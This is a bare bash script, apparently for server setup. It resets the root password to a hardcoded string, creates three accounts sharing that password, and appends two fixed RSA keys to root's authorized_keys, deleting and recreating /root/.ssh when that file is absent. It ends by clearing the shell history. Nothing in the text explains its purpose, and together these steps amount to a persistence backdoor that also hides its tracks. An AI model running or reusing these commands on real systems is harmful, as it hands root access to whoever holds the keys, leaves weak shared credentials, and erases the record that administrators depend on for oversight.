echo 'saipanno.com' | passwd root --stdin
useradd cdnscan
echo 'saipanno.com' | passwd cdnscan --stdin
useradd op
echo 'saipanno.com' | passwd op --stdin
useradd rd
echo 'saipanno.com' | passwd rd --stdin
if [ -f "/root/.ssh/authorized_keys" ];then
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEArturSzUc2lqCMXQZ7Z3WjRQwGQJLLb6uMFPemiSChURepIKNgOGsydeOIkEyHHUXgZYeC/MjveD6lL3nYUvjjOJgWUGiMM2Mk3ddV+w7ZkWf7RB/TSqaVRSfpAkk7JWcEx3TpWuGYtybqisRx2e/OV+r7lNt+9OuhThmCOXEy8YqDMmePIvfdSDNtAQ4NIRpJJKvn4fqKQBKyQ+H2enHxo/HVapaaEtVoHHiQICIcehXH+3CnWc5pgyNWOI4FBVI9/skdPloQlo07KZLYyJVH3U81oKzleoHmWMzEWnkCOWAXR5gG9iY8GAiDPV1jXSXyvsFn1i9ggYh59ZRyEOqFw== root@localhost.localdomain" >> /root/.ssh/authorized_keys
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxbCGj+L2wCywKvHeTaldW54ekOr9fnOXVO99mJm0NeB/WbeiD1ck5kHRKPMbeNU0jUf+JpJiC4zU/tFc2lTFKUx6Ed+j7YLf5/QBROju9x/rWTqpGYpGcpyirJBV4biEBEIz2JADO7DXZKqMQfvaCVhK8F/A6IKh90Fyb30BW/qahTWtxnRb0y0U5aWFZ8vXEqUiIIGZY1KA7H96+OMqycsrHwaYdvCzYIPkU2ZsLTHqsS3d3ohOb7IHv3LA4wJTLv/S+UdECGg75jhjGEiKn1gK2CLNGNjlBoCEGwyvwrjHl/evhm0i9qLE4Vzk2tVUVw6pshx+btGBrIW3qyYeqw== root@localhost.localdomain" >> /root/.ssh/authorized_keys
else
  rm -rf /root/.ssh
  mkdir /root/.ssh
  chmod 700 /root/.ssh
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEArturSzUc2lqCMXQZ7Z3WjRQwGQJLLb6uMFPemiSChURepIKNgOGsydeOIkEyHHUXgZYeC/MjveD6lL3nYUvjjOJgWUGiMM2Mk3ddV+w7ZkWf7RB/TSqaVRSfpAkk7JWcEx3TpWuGYtybqisRx2e/OV+r7lNt+9OuhThmCOXEy8YqDMmePIvfdSDNtAQ4NIRpJJKvn4fqKQBKyQ+H2enHxo/HVapaaEtVoHHiQICIcehXH+3CnWc5pgyNWOI4FBVI9/skdPloQlo07KZLYyJVH3U81oKzleoHmWMzEWnkCOWAXR5gG9iY8GAiDPV1jXSXyvsFn1i9ggYh59ZRyEOqFw== root@localhost.localdomain" > /root/.ssh/authorized_keys
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxbCGj+L2wCywKvHeTaldW54ekOr9fnOXVO99mJm0NeB/WbeiD1ck5kHRKPMbeNU0jUf+JpJiC4zU/tFc2lTFKUx6Ed+j7YLf5/QBROju9x/rWTqpGYpGcpyirJBV4biEBEIz2JADO7DXZKqMQfvaCVhK8F/A6IKh90Fyb30BW/qahTWtxnRb0y0U5aWFZ8vXEqUiIIGZY1KA7H96+OMqycsrHwaYdvCzYIPkU2ZsLTHqsS3d3ohOb7IHv3LA4wJTLv/S+UdECGg75jhjGEiKn1gK2CLNGNjlBoCEGwyvwrjHl/evhm0i9qLE4Vzk2tVUVw6pshx+btGBrIW3qyYeqw== root@localhost.localdomain" >> /root/.ssh/authorized_keys
fi
chmod 400 /root/.ssh/authorized_keys
history -cw
